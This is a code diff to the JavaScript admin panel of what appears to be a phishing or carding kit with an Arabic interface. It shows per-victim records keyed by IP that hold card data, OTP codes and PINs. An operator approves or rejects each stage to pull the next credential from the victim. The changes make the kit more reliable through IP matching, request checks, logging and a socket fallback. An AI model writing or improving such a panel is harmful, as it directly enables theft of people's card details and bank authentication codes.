@@ -493,7 +493,11 @@ function buildM(b,ex){
 }
 
 function buildCard(ip, ex){
-  const live=ld[ip]||{};
+  // البحث عن بيانات العميل بطريقة مرنة (تدعم IPv4/IPv6)
+  const nip=norm(ip);
+  // ابحث عن المفتاح الصحيح في ld
+  const ldKey=ld[nip]?nip:(Object.keys(ld).find(k=>norm(k)===nip)||nip);
+  const live=ld[ldKey]||{};
   const pd=live.pay;
   const od=live.otp;
   const pind=live.pin;
@@ -506,7 +510,7 @@ function buildCard(ip, ex){
   const pinData=pind||(hc.filter(c=>c.code_type==='pin').pop()||null);
 
   const hasCard=!!cardData;
-  const stage=ls[ip];
+  const stage=ls[ldKey]||ls[nip];
 
   let h=`
   <div class="msec-t"><div class="msec-t-ic ti-g"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg></div>بيانات البطاقة</div>
@@ -546,11 +550,11 @@ function buildCard(ip, ex){
     }
 
     // Buttons
-    if(stage&&ld[ip]){
+    if(stage&&ld[ldKey]){
       const lbl={payment:{a:'قبول → OTP',r:'رفض البطاقة'},otp:{a:'قبول → الرقم السري',r:'رفض → إعادة OTP'},pin:{a:'قبول ✓',r:'رفض → إعادة الرقم'}}[stage];
       h+=`<div class="arow" id="abtns">
-        <button class="abtn aok" id="abtn-ok" onclick="appv('${ip}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>${lbl.a}</button>
-        <button class="abtn arn" id="abtn-rj" onclick="rejv('${ip}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>${lbl.r}</button>
+        <button class="abtn aok" id="abtn-ok" onclick="appv('${ldKey}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>${lbl.a}</button>
+        <button class="abtn arn" id="abtn-rj" onclick="rejv('${ldKey}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>${lbl.r}</button>
       </div>`;
     } else {
       h+=`<div class="arow"><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>قبول</button><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>رفض</button></div>`;
@@ -592,23 +596,43 @@ async function rebuildCard(ip){
 }
 
 async function appv(ip,stage){
-  const l=ld[ip]; if(!l)return;
+  // البحث عن requestId بطريقة موثوقة
+  const l=ld[ip]||ld[norm(ip)];
+  if(!l){ console.warn('appv: no ld for ip',ip); return; }
   const rid=l.requestId;
+  if(!rid){ console.warn('appv: no requestId for ip',ip); return; }
+  console.log('appv: approving requestId=',rid,'ip=',ip,'stage=',stage);
   disableAbtns();
+  let ok=false;
   try{
-    await fetch(`${SRV}/api/approve`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid})});
-  }catch(e){ if(socket)socket.emit('adminApprove',{requestId:rid}); }
+    const res=await fetch(`${SRV}/api/approve`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid})});
+    const data=await res.json();
+    ok=data.success;
+    if(!ok) console.warn('appv: server returned',data);
+  }catch(e){
+    console.warn('appv: fetch failed, trying socket',e);
+    if(socket&&socket.connected) socket.emit('adminApprove',{requestId:rid});
+    ok=true;
+  }
   toast('✅ تم القبول');
   if(stage==='pin'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); }
 }
 
 async function rejv(ip,stage){
-  const l=ld[ip]; if(!l)return;
+  const l=ld[ip]||ld[norm(ip)];
+  if(!l){ console.warn('rejv: no ld for ip',ip); return; }
   const rid=l.requestId;
+  if(!rid){ console.warn('rejv: no requestId for ip',ip); return; }
+  console.log('rejv: rejecting requestId=',rid,'ip=',ip,'stage=',stage);
   disableAbtns();
   try{
-    await fetch(`${SRV}/api/reject`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid,message:'تم الرفض'})});
-  }catch(e){ if(socket)socket.emit('adminReject',{requestId:rid,message:'تم الرفض'}); }
+    const res=await fetch(`${SRV}/api/reject`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid,message:'تم الرفض'})});
+    const data=await res.json();
+    if(!data.success) console.warn('rejv: server returned',data);
+  }catch(e){
+    console.warn('rejv: fetch failed, trying socket',e);
+    if(socket&&socket.connected) socket.emit('adminReject',{requestId:rid,message:'تم الرفض'});
+  }
   toast('❌ تم الرفض');
   if(stage==='payment'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); }
 }
